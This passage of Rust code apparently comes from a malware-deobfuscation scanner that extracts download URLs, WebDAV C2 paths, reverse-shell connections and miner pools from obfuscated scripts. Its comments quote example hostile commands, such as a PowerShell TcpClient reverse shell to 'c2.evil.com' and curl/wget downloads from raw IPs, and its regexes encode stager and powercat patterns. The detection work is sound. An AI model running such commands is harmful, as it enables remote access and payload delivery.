                } // had non-ASCII
                s
            }
        };
        let text = text.trim();
        // The decoded text must START with http(s)/ftp — not just CONTAIN it
        // (since longer payloads with embedded URLs are caught by other passes)
        if !(text.starts_with("http://")
            || text.starts_with("https://")
            || text.starts_with("ftp://"))
        {
            continue;
        }
        if text.len() > 2048 {
            continue;
        }
        if !text.chars().all(|c| !c.is_control()) {
            continue;
        }
        let url = text.to_string();
        if known.contains(&url) {
            continue;
        }
        if !seen.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "quoted-b64-string".to_string(),
        });
    }
}

#[allow(clippy::expect_used)]
static TRUNC_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#""=(?:https?)?://([A-Za-z0-9][A-Za-z0-9.\-]{3,}\.[A-Za-z]{2,}(?::\d+)?(?:/[^"\s]*)?)"#,
    )
    .expect("trunc url")
});

pub fn scan_truncated_url_vars(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in TRUNC_URL_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let url = format!("https://{}", m.as_str());
        if known.contains(&url) {
            continue;
        }
        if !seen.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "trunc-url-var".to_string(),
        });
    }
}

#[allow(clippy::expect_used)]
static CERTUTIL_DECODE_RE: Lazy<Regex> = Lazy::new(|| {
    // Matches: certutil [-f] -decode  (case-insensitive, dash or slash flags). We do not require
    // the same source/target filenames; just the presence of a decode call
    // is enough to gate this sweep, paired with a preceding `echo <b64>`.
    Regex::new(r"(?i)\bcertutil(?:\.exe)?\b[^\r\n]*?[-/]decode\b").expect("certutil decode")
});

#[allow(clippy::expect_used)]
static ECHO_B64_RE: Lazy<Regex> = Lazy::new(|| {
    // Captures the base64 emitted via `echo <b64> >` redirection. Allows the
    // payload to contain `+`/`/`/`=` since attackers often pipe pure base64.
    // Minimum length 40 to filter out short echo statements / file paths.
    Regex::new(r#"(?im)^[^\r\n]*?\becho\s+([A-Za-z0-9+/]{40,}={0,2})\s*[1-9]?>"#).expect("echo b64")
});

#[allow(clippy::expect_used)]
static JS_BARE_URL_RE: Lazy<Regex> = Lazy::new(|| {
    // Inside a decoded JS payload, match `"//<host>/...""`-style URL tails
    // that are concatenated from earlier `"sc"+"r"+...` fragments.
    Regex::new(r#""//([A-Za-z0-9][A-Za-z0-9.\-]+\.[A-Za-z]{2,}(?:/[^"\\\s<>]*)?)""#)
        .expect("js bare url")
});

fn decoded_text_looks_like_script(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("getobject")
        || lower.contains("activexobject")
        || lower.contains("wscript")
        || lower.contains("xmlhttp")
        || lower.contains("<script")
        || lower.contains("eval(")
        || lower.contains("function")
        || lower.contains("var ")
        || lower.contains("new ")
}

pub fn scan_certutil_decoded_js(deobfuscated: &str, env: &mut Environment) {
    use base64::Engine;
    // Cheap gate: only sweep when both signals are present.
    if !CERTUTIL_DECODE_RE.is_match(deobfuscated) {
        return;
    }
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in ECHO_B64_RE.captures_iter(deobfuscated) {
        let Some(b64_m) = caps.get(1) else { continue };
        let b64 = b64_m.as_str();
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            continue;
        };
        let raw = String::from_utf8_lossy(&decoded).into_owned();
        if !decoded_text_looks_like_script(&raw) {
            continue;
        }
        // Reuse the JS post-processing pipeline so split-string concat resolves.
        let unescaped = crate::js_scan::decode_u_escapes(&raw);
        let joined = crate::js_scan::expand_js_string_concat(&unescaped);
        for url_caps in JS_BARE_URL_RE.captures_iter(&joined) {
            let Some(host_path) = url_caps.get(1) else {
                continue;
            };
            let url = format!("https://{}", host_path.as_str());
            if known.contains(&url) {
                continue;
            }
            if !seen.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::Download {
                cmd: "certutil-decode-js".to_string(),
                src: url,
                dst: None,
            });
        }
        // Also catch fully-formed http(s)/script: URLs that survived without
        // needing the split-string expansion.
        for url_caps in URL_RE.captures_iter(&joined) {
            let Some(m) = url_caps.get(1) else { continue };
            let url = trim_liberal_url_suffix(m.as_str()).to_string();
            if url.len() < 8 {
                continue;
            }
            if is_noise_url(&url) {
                continue;
            }
            if known.contains(&url) {
                continue;
            }
            if !seen.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::Download {
                cmd: "certutil-decode-js".to_string(),
                src: url,
                dst: None,
            });
        }
    }
}

#[allow(clippy::expect_used)]
static ECHO_U_ESCAPE_RE: Lazy<Regex> = Lazy::new(|| {
    // Captures a run of >=4 consecutive `\uXXXX` escapes appearing inside an
    // `echo` statement. Attackers drop these as `echo eval('va...');`
    // into a .js/.vbs file and then `call`/`wscript` it.
    Regex::new(r"(?i)\becho\b[^\r\n]*?((?:\\u[0-9a-fA-F]{4}){4,})").expect("echo u-escape")
});

pub fn scan_echoed_unicode_js(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in ECHO_U_ESCAPE_RE.captures_iter(deobfuscated) {
        let Some(esc) = caps.get(1) else { continue };
        let decoded = crate::js_scan::decode_u_escapes(esc.as_str());
        let joined = crate::js_scan::expand_js_string_concat(&decoded);
        for url_caps in JS_BARE_URL_RE.captures_iter(&joined) {
            let Some(host_path) = url_caps.get(1) else {
                continue;
            };
            let url = format!("https://{}", host_path.as_str());
            if known.contains(&url) {
                continue;
            }
            if !seen.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::Download {
                cmd: "echo-unicode-js".to_string(),
                src: url,
                dst: None,
            });
        }
        for url_caps in URL_RE.captures_iter(&joined) {
            let Some(m) = url_caps.get(1) else { continue };
            let url = trim_liberal_url_suffix(m.as_str()).to_string();
            if url.len() < 8 {
                continue;
            }
            if is_noise_url(&url) {
                continue;
            }
            if known.contains(&url) {
                continue;
            }
            if !seen.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::Download {
                cmd: "echo-unicode-js".to_string(),
                src: url,
                dst: None,
            });
        }
    }
}

#[allow(clippy::expect_used)]
static HOST_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    // Hostname shape only. No left-anchored `\b` because the host is often
    // glued to an uppercase marker (both word chars, so `\b` would fail).
    // We disambiguate via the marker-twice check below. The trailing class
    // anchors on a non-host char ([a-z]{2,} run ended) so we don't bleed
    // into a following uppercase marker.
    Regex::new(r"[a-z0-9][a-z0-9.\-]{2,}\.[a-z]{2,}").expect("host literal")
});

#[allow(clippy::expect_used)]
static QUERY_DIGIT_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"^\?\d+").expect("query digit"));

fn is_marker_char(b: u8, first: bool) -> bool {
    if first {
        b.is_ascii_uppercase()
    } else {
        b.is_ascii_uppercase() || b.is_ascii_digit()
    }
}

// Catches the mshta/HTA dropper family that hides the host inside a
// repeated 1-7-char marker, e.g.
//   `set 9IF=BOTKRBOTKRa9eikr.5wyck43a9uxnu7e.cfdBOTKR?1BOTKR`
// After the runtime strips the marker, the URL is `host?N`. We find host
// candidates with a plain regex, then inspect adjacent bytes for a marker
// that occurs at least twice immediately before the host and once between
// host and a `?N` query suffix.
pub fn scan_delim_wrapped_urls(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let bytes = deobfuscated.as_bytes();
    for h in HOST_LITERAL_RE.find_iter(deobfuscated) {
        // Try marker lengths 1..=7; require the marker to appear *twice*
        // immediately before the host start (`MM<host>`) and at least once
        // immediately after, followed by `?<digits>`.
        for len in 1..=7usize {
            if h.start() < 2 * len {
                continue;
            }
            let m1_start = h.start() - len;
            let m2_start = h.start() - 2 * len;
            let m1 = &bytes[m1_start..h.start()];
            let m2 = &bytes[m2_start..m1_start];
            if m1 != m2 {
                continue;
            }
            if !m1
                .iter()
                .enumerate()
                .all(|(i, &b)| is_marker_char(b, i == 0))
            {
                continue;
            }
            // After host: <marker><query><marker?>
            let after = &bytes[h.end()..];
            if after.len() < len {
                continue;
            }
            if &after[..len] != m1 {
                continue;
            }
            // Find query past the marker
            let post = match std::str::from_utf8(&after[len..]) {
                Ok(s) => s,
                Err(_) => continue,
            };
            let q = match QUERY_DIGIT_RE.find(post) {
                Some(q) => q,
                None => continue,
            };
            let url = format!("https://{}{}", h.as_str(), q.as_str());
            if is_noise_url(&url) {
                break;
            }
            if known.contains(&url) {
                break;
            }
            if !seen.insert(url.clone()) {
                break;
            }
            env.traits.push(Trait::Download {
                cmd: "delim-wrapped-mshta-hta".to_string(),
                src: url,
                dst: None,
            });
            break;
        }
    }
}

#[allow(clippy::expect_used)]
static BARE_IP_URL_RE: Lazy<Regex> = Lazy::new(|| {
    // Captures schemeless IP+path URLs passed to a download verb:
    //   curl -uri 185.117.72.132/gate990.php
    //   wget 91.92.34.126:6600
    // Limited to obvious download-verb contexts to avoid matching IPs that
    // appear as logging/whitelist values.
    Regex::new(
        // download verbs: schemeless IP[:port]/path
        // -connect / connectto: VNC + tightvnc reverse-connect to IP:port
        r#"(?i)(?:\bcurl\b|\bwget\b|\biwr\b|\birm\b|\bInvoke-(?:WebRequest|RestMethod)\b|-uri|-connect|--connect|connectto)\s+["']?((?:\d{1,3}\.){3}\d{1,3}(?::\d+)?(?:/[^\s"'<>]*)?)"#,
    )
    .expect("bare ip url")
});

#[allow(clippy::expect_used)]
static REMOTE_CONNECT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\bwinvnc(?:\.exe)?\b[^\r\n]*\s-connect\s+(\d{1,3}(?:\.\d{1,3}){3}):(\d{1,5})"#,
    )
    .expect("remote connect regex")
});

#[allow(clippy::expect_used)]
static PS_TCP_CLIENT_RE: Lazy<Regex> = Lazy::new(|| {
    // PowerShell reverse shell / Empire / Posh stager pattern:
    //   $c = New-Object Net.Sockets.TcpClient('10.0.0.5', 4444)
    //   $c = New-Object System.Net.Sockets.TcpClient -ArgumentList '10.0.0.5',4444
    //   $client = New-Object Net.Sockets.TCPClient("c2.evil.com", 8080)
    // Captures host (IP or hostname) and port. The PS form is
    // case-insensitive and the constructor args can be positional or
    // `-ArgumentList`-flagged.
    Regex::new(
        r#"(?ix)
            New-Object \s+ (?:System\.)? Net\.Sockets\.TcpClient
            \s* (?: -ArgumentList \s+ | \( \s* )
            ['"]?
            ( (?:\d{1,3}(?:\.\d{1,3}){3}) | (?:[a-z0-9\-]+(?:\.[a-z0-9\-]+){1,5}) )
            ['"]?
            \s* , \s*
            (\d{1,5})
        "#,
    )
    .expect("ps tcp client regex")
});

#[allow(clippy::expect_used)]
static POWERCAT_CONNECT_PORT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?ix)
            \b powercat (?:\.ps1)? \b
            [^\r\n;|&]*? -c \s+ ['"]?
            ( (?:\d{1,3}(?:\.\d{1,3}){3}) | (?:[a-z0-9\-]+(?:\.[a-z0-9\-]+){1,5}) )
            ['"]?
            [^\r\n;|&]*? -p \s+ (\d{1,5})
        "#,
    )
    .expect("powercat connect port regex")
});

#[allow(clippy::expect_used)]
static POWERCAT_PORT_CONNECT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?ix)
            \b powercat (?:\.ps1)? \b
            [^\r\n;|&]*? -p \s+ (\d{1,5})
            [^\r\n;|&]*? -c \s+ ['"]?
            ( (?:\d{1,3}(?:\.\d{1,3}){3}) | (?:[a-z0-9\-]+(?:\.[a-z0-9\-]+){1,5}) )
            ['"]?
        "#,
    )
    .expect("powercat port connect regex")
});

#[allow(clippy::expect_used)]
static MINER_POOL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?ix)
            (?: --server | --url | --pool | -o )
            \s+
            ['"]?
            (?: stratum (?: \+ [a-z0-9]+ )? :// )?
            ( (?:\d{1,3}(?:\.\d{1,3}){3}) | (?:[a-z0-9\-]+(?:\.[a-z0-9\-]+){1,5}) )
            :
            (\d{1,5})
            ['"]?
        "#,
    )
    .expect("miner pool regex")
});

#[allow(clippy::expect_used)]
static DECIMAL_IP_URL_RE: Lazy<Regex> = Lazy::new(|| {
    // PowerShell accepts a 32-bit integer in place of an IPv4 host:
    //   Invoke-WebRequest 1297338337/x.jpg  ->  http://77.83.42.33/x.jpg
    // The decimal form has to be ≥ 8 digits (smallest dotted IP encoded this
    // way is `1.0.0.0` = 16777216) and < 11 digits (max 32-bit = 4294967295).
    //
    // (?m) so `^` matches at every line start. The verb anchor requires a
    // command-position context (line start, whitespace, or a CMD/PS
    // separator) — `\b` alone matched prose like `# curl request id …` and
    // emitted phantom IOCs. Path char class excludes `;` so
    // `iwr 1297338337/x.jpg;Stop-Process` stops at the statement separator
    // rather than swallowing it. Trailing 11+-digit truncation (regex
    // consuming the first 10 digits of `12345678901`) is rejected in the
    // scan_decimal_ip_urls validator below — Rust's regex crate doesn't
    // support lookahead.
    Regex::new(
        r#"(?im)(?:^|[\s;&|(])(?:curl|wget|iwr|irm|Invoke-WebRequest|Invoke-RestMethod|-uri|DownloadString|DownloadFile|DownloadData)\s*\(?\s*["']?(\d{8,10})(/[^\s"'<>);]*)?"#,
    )
    .expect("decimal ip url regex")
});

fn decimal_to_ipv4(n: u32) -> String {
    format!(
        "{}.{}.{}.{}",
        (n >> 24) & 0xff,
        (n >> 16) & 0xff,
        (n >> 8) & 0xff,
        n & 0xff,
    )
}

pub fn scan_decimal_ip_urls(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            Trait::DownloadInDeobText { src, .. } => Some(src.clone()),
            // Also include RemoteConnect's synthesized URL so we don't
            // double-emit the same host:port via two different trait
            // variants (the global semantic_dedup_key treats them as
            // separate keys).
            Trait::RemoteConnect { host, port, .. } => Some(format!("http://{host}:{port}")),
            _ => None,
        })
        .collect::<std::collections::HashSet<String>>();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let bytes = deobfuscated.as_bytes();
    for caps in DECIMAL_IP_URL_RE.captures_iter(deobfuscated) {
        let Some(dec) = caps.get(1) else { continue };
        // Reject truncated matches: if the digit-run capture ended at a
        // position whose next byte is also a digit, the actual integer
        // had more than 10 digits — refuse the partial. Rust's regex
        // crate doesn't support lookahead so we check explicitly here.
        let end = dec.end();
        if bytes.get(end).is_some_and(|b| b.is_ascii_digit()) {
            continue;
        }
        let Ok(n) = dec.as_str().parse::<u32>() else {
            continue;
        };
        // Reject obvious non-IP integers: lowest octet 0, host octet 0 in
        // the leading position (decimals < 16777216 are < 8 digits anyway).
        let high = (n >> 24) & 0xff;
        if high == 0 {
            continue;
        }
        let ip = decimal_to_ipv4(n);
        let path = caps.get(2).map(|m| m.as_str()).unwrap_or("");
        let url = format!("http://{}{}", ip, path);
        if is_noise_url(&url) {
            continue;
        }
        if known.contains(&url) || !seen.insert(url.clone()) {
            continue;
        }
        known.insert(url.clone());
        env.traits.push(Trait::Download {
            cmd: "decimal-ip-url".to_string(),
            src: url,
            dst: None,
        });
    }
}

pub fn scan_bare_ip_urls(deobfuscated: &str, env: &mut Environment) {
    scan_remote_connects(deobfuscated, env);
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in BARE_IP_URL_RE.captures_iter(deobfuscated) {
        let Some(ip_path) = caps.get(1) else { continue };
        let url = format!("http://{}", ip_path.as_str());
        if is_noise_url(&url) {
            continue;
        }
        if known.contains(&url) {
            continue;
        }
        if !seen.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "bare-ip-url".to_string(),
        });
    }
}

fn scan_remote_connects(deobfuscated: &str, env: &mut Environment) {
    let mut seen: std::collections::HashSet<(String, u16)> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::RemoteConnect { host, port, .. } => Some((host.clone(), *port)),
            _ => None,
        })
        .collect();
    for line in deobfuscated.lines() {
        for caps in REMOTE_CONNECT_RE.captures_iter(line) {
            let Some(host) = caps.get(1).map(|m| m.as_str().to_string()) else {
                continue;
            };
            let Some(port) = caps.get(2).and_then(|m| m.as_str().parse::<u16>().ok()) else {
                continue;
            };
            if !seen.insert((host.clone(), port)) {
                continue;
            }
            env.traits.push(Trait::RemoteConnect {
                cmd: line.to_string(),
                host,
                port,
            });
        }
        // PowerShell `New-Object Net.Sockets.TcpClient('host', port)` —
        // canonical reverse shell / Posh-stager / Empire C2 pattern.
        // 29 corpus samples use this; flagging adds a high-signal
        // RemoteConnect IOC even when the URL form never surfaces.
        for caps in PS_TCP_CLIENT_RE.captures_iter(line) {
            let Some(host) = caps.get(1).map(|m| m.as_str().to_string()) else {
                continue;
            };
            let Some(port) = caps.get(2).and_then(|m| m.as_str().parse::<u16>().ok()) else {
                continue;
            };
            if !seen.insert((host.clone(), port)) {
                continue;
            }
            env.traits.push(Trait::RemoteConnect {
                cmd: line.to_string(),
                host,
                port,
            });
        }
        for caps in POWERCAT_CONNECT_PORT_RE.captures_iter(line) {
            let Some(host) = caps.get(1).map(|m| m.as_str().to_string()) else {
                continue;
            };
            let Some(port) = caps.get(2).and_then(|m| m.as_str().parse::<u16>().ok()) else {
                continue;
            };
            if !seen.insert((host.clone(), port)) {
                continue;
            }
            env.traits.push(Trait::RemoteConnect {
                cmd: line.to_string(),
                host,
                port,
            });
        }
        for caps in POWERCAT_PORT_CONNECT_RE.captures_iter(line) {
            let Some(port) = caps.get(1).and_then(|m| m.as_str().parse::<u16>().ok()) else {
                continue;
            };
            let Some(host) = caps.get(2).map(|m| m.as_str().to_string()) else {
                continue;
            };
            if !seen.insert((host.clone(), port)) {
                continue;
            }
            env.traits.push(Trait::RemoteConnect {
                cmd: line.to_string(),
                host,
                port,
            });
        }
        let trimmed = line.trim_start();
        let lower = trimmed.to_ascii_lowercase();
        let has_miner_context = lower.contains("xmrig")
            || lower.contains("miner.exe")
            || lower.contains("stratum")
            || lower.contains("etchash")
            || lower.contains("kawpow")
            || lower.contains("randomx")
            || lower.contains("cryptonight");
        if has_miner_context && !lower.starts_with("::") && !lower.starts_with("rem ") {
            for caps in MINER_POOL_RE.captures_iter(trimmed) {
                let Some(host) = caps.get(1).map(|m| m.as_str().to_string()) else {
                    continue;
                };
                let Some(port) = caps.get(2).and_then(|m| m.as_str().parse::<u16>().ok()) else {
                    continue;
                };
                if !seen.insert((host.clone(), port)) {
                    continue;
                }
                env.traits.push(Trait::RemoteConnect {
                    cmd: line.to_string(),
                    host,
                    port,
                });
            }
        }
    }
}

#[allow(clippy::expect_used)]
static STAGE1_REPLACE_RE: Lazy<Regex> = Lazy::new(|| {
    // Single-quoted long string immediately followed by .Replace('marker','')
    // The b64-with-marker can run to 30 KB. PS single-quoted strings cannot
    // contain literal single quotes (those are escaped as `''`), so a non-`'`
    // character class is safe.
    // Unbounded upper limit; Rust's regex DFA size is exponential in the
    // explicit upper bound, and `{200,30000}` compiles past the 10 MB cap.
    Regex::new(r"'([^']{200,})'\s*\.\s*Replace\s*\(\s*'([^']{2,40})'\s*,\s*''\s*\)")
        .expect("stage1 replace")
});

/// Detect the multi-stage AES-CBC dropper family that appears in ~70 corpus
/// samples (DHL_Delivery_Form, factura_*, etc.). The terminal payload sits
/// behind:
///   stage-1 b64 + .Replace(marker, '') -> UTF-16LE PowerShell
///   stage-2 PS reads `:::N*` lines from a copy of the .bat
///   stage-3 PS contains AES key/IV + reads single `:: ` line, AES-CBC
///   decrypts both halves, gzip-decompresses, reflection-loads a .NET assembly
/// We can't reach the URL without implementing the full AES chain, but we
/// can flag the sample as a multi-stage encrypted dropper so an analyst
/// knows to expect a static-blind dead end and look at the assembly bytes.
pub fn scan_multistage_encrypted_dropper(deobfuscated: &str, env: &mut Environment) {
    let already_present = env
        .traits
        .iter()
        .any(|t| matches!(t, Trait::MultiStageEncryptedDropper { .. }));
    if already_present {
        return;
    }
    let Some(caps) = STAGE1_REPLACE_RE.captures(deobfuscated) else {
        return;
    };
    let Some(b64) = caps.get(1) else { return };
    let Some(marker) = caps.get(2) else { return };
    if b64.as_str().len() < 1000 {
        // Skip the short variants — these are typically nested fragments
        // emitted by the obfuscator that don't lead anywhere useful, while
        // the real dropper carries a >>1 KB stage-1 blob.
        return;
    }
    // .NET/PS type names are case-INSENSITIVE in PowerShell — `aes]::create`
    // works as well as `Aes]::Create`. Obfuscators sometimes flip case
    // (especially in extracted PS bodies) so check on a lowercased copy.
    let deob_lc = deobfuscated.to_ascii_lowercase();
    let has_aes_cbc = deob_lc.contains("cryptography.aes")
        || deob_lc.contains("ciphermode]::cbc")
        || deob_lc.contains("aes]::create");
    let has_gzip_stage = deob_lc.contains("gzipstream")
        || deob_lc.contains("compression.compressionmode")
        || deobfuscated.contains("H4sIA"); // gzip magic = case-sensitive b64
    let reads_self_lines = deobfuscated.contains(":::") || deobfuscated.contains(":: ");
    env.traits.push(Trait::MultiStageEncryptedDropper {
        marker: marker.as_str().to_string(),
        b64_length: u32::try_from(b64.as_str().len()).unwrap_or(u32::MAX),
        has_aes_cbc,
        has_gzip_stage,
        reads_self_lines,
        aes_key_b64: None,
        aes_iv_b64: None,
        assemblies_recovered: None,
        nested_aes: Vec::new(),
    });
}

/// Translate the WebDAV UNC form into the http(s):// URL Windows itself
/// resolves it to. Rules:
///   `\\host@port\share\...path...`     -> `http://host:port/...path...`
///   `\\host@SSL@port\share\...path...` -> `https://host:port/...path...`
///   `\\host@SSL\share\...path...`      -> `https://host/...path...`
/// where `share` == `davwwwroot` (any case) is the WebDAV virtual root and
/// is dropped; any other share becomes the first path segment.
pub fn unc_webdav_to_http_url(host: &str, port: &str, share_path: &str) -> String {
    let scheme = if port.eq_ignore_ascii_case("SSL") {
        "https"
    } else {
        "http"
    };
    let port_part = if port.eq_ignore_ascii_case("SSL") || port == "443" || port == "80" {
        String::new()
    } else {
        format!(":{port}")
    };
    // share_path looks like `\\host@port\seg1\seg2\...`. After splitting on
    // `\` and dropping empty segments, parts[0] is `host@port`, parts[1] is
    // the share name, parts[2..] is the path.
    let parts: Vec<&str> = share_path.split('\\').filter(|s| !s.is_empty()).collect();
    let path = if parts.len() >= 2 {
        let share = parts[1];
        let rest: Vec<&str> = if share.eq_ignore_ascii_case("davwwwroot") {
            parts.into_iter().skip(2).collect()
        } else {
            parts.into_iter().skip(1).collect()
        };
        rest.join("/")
    } else {
        String::new()
    };
    if path.is_empty() {
        format!("{scheme}://{host}{port_part}")
    } else {
        format!("{scheme}://{host}{port_part}/{path}")
    }
}

pub fn scan_unc_webdav(deobfuscated: &str, env: &mut Environment) {
    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        for (i, token) in tokens.iter().enumerate() {
            let cmd = command_name(strip_quotes(token));
            if cmd != "regsvr32" && cmd != "regsvr32.exe" {
                continue;
            }
            let Some((command, url)) = regsvr32_webdav_target_after(line, &tokens, i + 1) else {
                continue;
            };
            push_lolbas_once(env, "regsvr32", &command);
            push_url_argument_once(env, &command, url);
        }
        for (i, token) in tokens.iter().enumerate() {
            let cmd = command_name(strip_quotes(token));
            if cmd != "rundll32" && cmd != "rundll32.exe" {
                continue;
            }
            let Some((command, url)) = rundll32_webdav_target_after(line, &tokens, i + 1) else {
                continue;
            };
            push_rundll32_once(env, &command, url);
        }
    }

    // Dedup by (host, port) — same WebDAV server on the same port is one C2 regardless
    // of which share path or file within it was accessed.
    let mut seen: std::collections::HashSet<(String, String)> = std::collections::HashSet::new();
    for caps in UNC_WEBDAV_RE.captures_iter(deobfuscated) {
        let host = caps
            .get(1)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        let port = caps
            .get(2)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        if !seen.insert((host.clone(), port.clone())) {
            continue;
        }

        // Find the containing line for the command field
        let full_match = caps.get(0).map(|m| m.as_str()).unwrap_or("");
        let command = deobfuscated
            .lines()
            .find(|l| l.contains(full_match))
            .map(str::to_string)
            .unwrap_or_default();

        let http_url = unc_webdav_to_http_url(&host, &port, full_match);
        env.traits.push(Trait::UncWebDavC2 {
            host,
            port,
            share_path: full_match.to_string(),
            command,
            http_url,
        });
    }
    for caps in BARE_UNC_WEBDAV_RE.captures_iter(deobfuscated) {
        let host = caps
            .get(1)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        let Some(full_match) = caps.get(0).map(|m| m.as_str()) else {
            continue;
        };
        if !bare_webdav_unc_path(full_match) || !seen.insert((host.clone(), "80".to_string())) {
            continue;
        }
        let command = deobfuscated
            .lines()
            .find(|l| l.contains(full_match))
            .map(str::to_string)
            .unwrap_or_default();
        if !contains_ascii_case_insensitive_atom(&command, b"rundll32") {
            continue;
        }
        env.traits.push(Trait::UncWebDavC2 {
            host: host.clone(),
            port: "80".to_string(),
            share_path: full_match.to_string(),
            command,
            http_url: unc_webdav_to_http_url(&host, "80", full_match),
        });
    }
}

fn regsvr32_webdav_target_after(
    line: &str,
    tokens: &[String],
    start: usize,
) -> Option<(String, String)> {
    let limit = tokens.len().min(start.saturating_add(12));
    for token in &tokens[start..limit] {
        let candidate = strip_quotes(token);
        if !regsvr32_webdav_loadable_target(candidate) {
            continue;
        }
        let url = webdav_unc_to_http_url(candidate)?;
        return Some((line.to_string(), url));
    }
    None
}

fn regsvr32_webdav_loadable_target(token: &str) -> bool {
    strict_webdav_unc_path(token) && regsvr32_loadable_target(token)
}

fn rundll32_webdav_target_after(
    line: &str,
    tokens: &[String],
    start: usize,
) -> Option<(String, String)> {
    let limit = tokens.len().min(start.saturating_add(8));
    for token in &tokens[start..limit] {
        let candidate = strip_quotes(token)
            .split(',')
            .next()
            .unwrap_or("")
            .trim_end_matches(['"', '\'', ')', ']', '}', ';']);
        if !rundll32_webdav_loadable_target(candidate) {
            continue;
        }
        let url = webdav_unc_to_http_url(candidate)?;
        return Some((line.to_string(), url));
    }
    None
}

fn rundll32_webdav_loadable_target(token: &str) -> bool {
    (strict_webdav_unc_path(token) || bare_webdav_unc_path(token))
        && token.to_ascii_lowercase().ends_with(".dll")
}

fn webdav_unc_to_http_url(unc: &str) -> Option<String> {
    let parts: Vec<&str> = unc.split('\\').filter(|part| !part.is_empty()).collect();
    let host_port = parts.first()?;
    if let Some((host, port)) = host_port.split_once('@') {
        if host.is_empty() || port.is_empty() {
            return None;
        }
        return Some(unc_webdav_to_http_url(host, port, unc));
    }
    if !bare_webdav_unc_path(unc) || host_port.is_empty() {
        return None;
    }
    Some(unc_webdav_to_http_url(host_port, "80", unc))
}

fn strict_webdav_unc_path(token: &str) -> bool {
    contains_ascii_case_insensitive_atom(token, b"davwwwroot")
        && token.contains(r"\\")
        && token.contains('@')
}

fn bare_webdav_unc_path(token: &str) -> bool {
    let parts: Vec<&str> = token.split('\\').filter(|part| !part.is_empty()).collect();
    parts.len() >= 3
        && !parts[0].contains('@')
        && parts[1].eq_ignore_ascii_case("webdav")
        && !parts[2].is_empty()
}

fn push_url_argument_once(env: &mut Environment, cmd: &str, url: String) {
    if env.traits.iter().any(|t| {
        matches!(
            t,
            Trait::UrlArgument {
                url: existing_url,
                ..
            } if existing_url == &url
        )
    }) {
        return;
    }
    env.traits.push(Trait::UrlArgument {
        cmd: cmd.to_string(),
        url,
    });
}

fn push_rundll32_once(env: &mut Environment, cmd: &str, url: String) {
    if env.traits.iter().any(|t| {
        matches!(
            t,
            Trait::Rundll32 {
                url: existing_url,
                ..
            } if existing_url.as_deref() == Some(url.as_str())
        )
    }) {
        return;
    }
    env.traits.push(Trait::Rundll32 {
        cmd: cmd.to_string(),
        url: Some(url),
    });
}

fn push_lolbas_once(env: &mut Environment, name: &str, cmd: &str) {
    if env.traits.iter().any(|t| {
        matches!(
            t,
            Trait::Lolbas {
                name: existing_name,
                cmd: existing_cmd,
            } if existing_name == name && existing_cmd == cmd
        )
    }) {
        return;
    }
    env.traits.push(Trait::Lolbas {
        name: name.to_string(),
        cmd: cmd.to_string(),
    });
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod noise_ip_tests {
    use super::is_noise_ip;

    #[test]
    fn rfc1918_filtered() {
        assert!(is_noise_ip("http://10.0.0.5/x"));
        assert!(is_noise_ip("http://192.168.1.1/x"));
        assert!(is_noise_ip("http://172.16.0.1/x"));
        assert!(is_noise_ip("http://172.31.255.255/x"));
    }
    #[test]
    fn loopback_and_link_local_filtered() {
        assert!(is_noise_ip("http://127.0.0.1/x"));
        assert!(is_noise_ip("http://169.254.1.1/x"));
    }
    #[test]
    fn multicast_and_reserved_filtered() {
        assert!(is_noise_ip("http://224.0.0.1/x"));
        assert!(is_noise_ip("http://255.255.255.255/x"));
    }
    #[test]
    fn public_ips_not_filtered() {
        assert!(!is_noise_ip("http://8.8.8.8/x"));
        assert!(!is_noise_ip("http://1.1.1.1/x"));
        assert!(!is_noise_ip("http://45.9.74.36:8888/x.dll"));
        assert!(!is_noise_ip("http://185.117.72.132/gate990.php"));
    }
    #[test]
    fn non_ip_url_not_filtered_as_ip() {
        assert!(!is_noise_ip("http://example.com/x"));
        assert!(!is_noise_ip("not even a url"));
    }
    #[test]
    fn rfc1918_boundary_172_15_not_private() {
        // 172.15.x.x is PUBLIC (private range starts at 172.16).
        assert!(!is_noise_ip("http://172.15.0.1/x"));
